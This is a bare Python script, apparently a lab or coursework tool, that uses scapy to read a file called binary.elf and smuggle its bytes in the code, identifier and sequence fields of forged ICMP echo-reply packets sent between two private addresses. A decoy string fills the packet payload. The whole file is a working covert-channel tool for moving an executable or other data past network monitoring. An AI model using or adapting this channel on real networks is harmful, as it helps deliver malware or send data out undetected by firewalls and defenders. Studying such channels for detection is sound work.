from scapy.all import *
import math

bytarr = b''
pktarr = []

try:
    with open("binary.elf", "rb") as f:
        byte = f.read(1)
        while byte:
            bytarr = bytarr + byte
            print(byte)
            byte = f.read(1)

    print("byte array: " + str(bytarr))
    print("byte array size: " + str(len(bytarr)))
    
    pad = 5 * math.ceil(len(bytarr)/5)
    if pad > len(bytarr):
        diff = pad - len(bytarr)
        i=0
        while i < diff:
            bytarr = bytarr + b'\x00'
            i = i + 1
        print("bytarr new size: " + str(bytarr))

    i = 0
    while i < len(bytarr):        
        cod = '{:02x}'.format(bytarr[i])
        ident = ''.join('{:02x}'.format(x) for x in bytarr[i+1:i+3])
        seq = ''.join('{:02x}'.format(x) for x in bytarr[i+3:i+5])

        i=i+5

        p = IP(src="10.0.0.182", dst="10.0.0.33")\
        /ICMP(type=0,code=RawVal(bytes.fromhex(cod)),id=RawVal(bytes.fromhex(ident))\
        ,seq=RawVal(bytes.fromhex(seq)))/"ABCDEFG"

        pktarr.append(p)

        #print("code: " + code)
        #print("identifier: " + str(ident))
        #print("sequence: " + seq)

    print(str(len(pktarr)))

    for pkt in pktarr:
        send(pkt)
except IOError:
    print("Error opening file :)")
